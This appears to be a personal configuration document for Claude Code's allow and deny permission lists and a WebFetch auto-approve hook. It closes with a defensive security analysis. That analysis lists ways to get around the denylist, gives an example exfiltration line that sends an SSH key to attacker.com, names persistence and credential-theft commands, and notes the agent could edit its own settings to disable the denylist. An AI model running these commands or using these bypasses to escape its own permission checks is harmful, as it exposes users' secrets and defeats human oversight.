# Claude Code permissions

How to move from yolo mode to an explicit allow/deny model.

## Status

Applied 2026-05-25. `skipDangerousModePermissionPrompt` set to `false` in `~/.claude/settings.json`.

Allow and deny lists added 2026-05-25 as documented below.

## How the permission model works

Claude Code uses a three-tier model: **deny > allow > prompt**.

- **deny** — always blocked, no override
- **allow** — runs silently, no prompt
- **prompt** — asks once; "don't ask again" auto-adds to settings

`skipDangerousModePermissionPrompt: true` (yolo mode) bypasses the prompt tier entirely — everything not denied runs silently. Setting it to `false` restores the prompt tier.

Hooks (`PreToolUse` etc.) continue to run regardless of yolo mode.

## Pattern syntax

Patterns are `Tool(argument-pattern)`. For Bash, use `:*` as the wildcard suffix:

```
Bash(git status:*)     # matches "git status" with any args
Bash(git status)       # matches only the literal "git status" (no args)
Bash(git:*)            # matches ANY git subcommand — too broad for push/reset
```

- Compound commands (`a && b`, `a | b`) are matched as a whole string. `Bash(ls:*)` will not auto-allow `ls && rm foo` — the prompt fires on the compound.
- Deny always wins over allow, regardless of order.
- Settings cascade: user `~/.claude/settings.json` → project `.claude/settings.json` → project `.claude/settings.local.json`. Project-local additions merge with user-level.

## RTK compatibility

RTK rewrites Bash commands via a `PreToolUse` hook (e.g. `ls -la` → `rtk ls -la`). The permission check is applied to the **rewritten** command. With `Bash(*)` in the allowlist this is moot — all commands pass regardless of prefix. If the allowlist is ever tightened back to named entries, each one needs an `rtk`-prefixed twin.

## Current config (`~/.claude/settings.json`)

### Allow list

```json
"allow": [
  "Bash(*)",
  "Read(**)",
  "Edit(**)",
  "Write(**)",
  "WebSearch"
]
```

`Bash(*)` covers all shell commands including compound `&&` and `|` forms. This is not YOLO mode — the denylist always wins and still hard-blocks the dangerous operations below. The earlier ~60-entry explicit allowlist was abandoned because compound commands (`cd /x && mv ...`) always triggered prompts regardless of whether the individual commands were allowed.

`Read`/`Edit`/`Write` are globally permitted. `WebSearch` is silent. `WebFetch` is handled via a `PreToolUse` hook (see below) because `WebFetch(domain:*)` is a confirmed bug ([#11972](https://github.com/anthropics/claude-code/issues/11972)) — the wildcard never matches.

### Deny list

```json
"deny": [
  "Bash(rm:*)",
  "Bash(sudo:*)",
  "Bash(git push --force:*)",
  "Bash(git push -f:*)",
  "Bash(git push --force-with-lease:*)",
  "Bash(git add:*)",
  "Bash(./do.sh:*)",
  "Bash(do.sh:*)",
  "Bash(./bin/:*)",
  "Bash(bin/:*)"
]
```

Notes:
- `Bash(rm:*)` covers `rm -rf` — no need for a separate entry
- `Bash(sudo:*)` blocks all sudo, not just `sudo rm`
- Three force-push entries cover `--force`, `-f`, and `--force-with-lease`
- `do.sh` and `bin/` entries enforce the CLAUDE.md rule: never run these autonomously
- Optional additions if needed: `Bash(git reset --hard:*)`, `Bash(git clean -f:*)`, `Bash(git checkout -- :*)`

### Hooks

```json
"PreToolUse": [
  {
    "matcher": "WebFetch",
    "hooks": [
      {
        "type": "command",
        "command": "echo '{\"hookSpecificOutput\": {\"hookEventName\": \"PreToolUse\", \"permissionDecision\": \"allow\"}}'",
        "timeout": 5
      }
    ]
  }
]
```

A `PreToolUse` hook for `WebFetch` that returns `permissionDecision: allow` before the prompt fires. Necessary because `WebFetch(domain:*)` in the allow list is bugged and non-functional.

**Why not `PermissionRequest`?** `permissionDecision` is only supported in `PreToolUse` hooks — `PermissionRequest` hooks do not honour it and the prompt still fires.

**Reload required:** Hook changes mid-session are not picked up automatically. Open `/hooks` once to reload config, or restart the session.

## What stays behind a prompt

With `Bash(*)` in the allowlist, almost nothing prompts. The only things that still prompt are tools not covered by the allowlist entries above — in practice this is rare. The denylist items are hard-blocked (no prompt, just denied).

## Security analysis and future improvements

Recorded 2026-05-25. Reference material for revisiting the denylist strategy.

### Current strategy summary

`Bash(*)` in the allowlist means all shell commands run silently. The denylist is the meaningful safety boundary. The threat model is prompt injection: malicious web content instructs Claude to run destructive or exfiltrating commands, which execute without a prompt.

### Known denylist bypass techniques

Token-prefix matching only checks the literal first token of a command string:

- `Bash(rm:*)` does not block `/bin/rm`, `find . -delete`, `python -c 'os.remove(...)'`, or `mv x /tmp`
- `do.sh` entries do not cover `bash do.sh`, `sh ./do.sh`, `cat do.sh | bash`, or `source do.sh`
- `git push --force` entries do not cover `git push origin +main` (force via refspec) or `git -c ... push --force`
- `git add` is blocked but `git commit -a` and `git stage` are not
- Compound forms using `&&`, `;`, `$(`, backticks, or `>` to home paths cannot be caught by denylist entries

### Unblocked attack vectors (all currently silent)

**Exfiltration:** `curl -X POST attacker.com -d @~/.ssh/id_ed25519`, `wget --post-file`, `nc`, reading credentials then using WebFetch to exfiltrate.

**Persistence:** writing to `~/.zshrc`, `~/.zshrc_machine`, `~/.ssh/authorized_keys`, `~/Library/LaunchAgents/*.plist`, `crontab`.

**Destruction without `rm`:** `> file` (truncate), `dd if=/dev/zero`, `find . -delete`, `git clean -fdx`, `git reset --hard`, `git checkout .`.

**Credential theft:** `~/.aws/credentials`, `~/.netrc`, `security find-generic-password`, `gh auth token`.

**Denylist self-modification:** Claude can silently edit `~/.claude/settings.json` to disable its own denylist. `Write(**)` is currently in the allowlist with no path exclusions.

### Recommended improvements

**High priority — exfiltration and persistence:**
- Add to denylist: `curl`, `wget`, `nc`, `ssh`, `scp`, `crontab`, `launchctl`, `osascript`, `eval`
- Add `Edit`/`Write` denies for sensitive paths: `~/.ssh/**`, `~/.claude/**`, `~/.aws/**`, `~/.zshrc*`, `~/Library/LaunchAgents/**`

**Medium priority — git safety gaps:**
- Add `git reset --hard`, `git clean`, `git checkout --` to denylist
- `git push origin +main` (force via refspec) is not covered by current force-push entries

**WebFetch (highest prompt-injection risk):**
- Currently wide open via `PreToolUse` hook — any domain, silently
- Recommendation: lock to a specific allowlist of domains actually used (docs, trusted references)
- This is the primary vector for prompt injection attacks from malicious page content

**Structural limitation:**
- Token-prefix matching cannot reliably block compound commands
- A `PreToolUse` hook that rejects Bash commands containing `|`, `&&`, `;`, `$(`, backticks, or `>` to `~/` paths would be more robust than additional denylist entries

## See also

- `doc/installing-claude-yolo-mode.md` — original yolo mode setup
- `doc/claude-context-management.md` — context window costs and optimisations
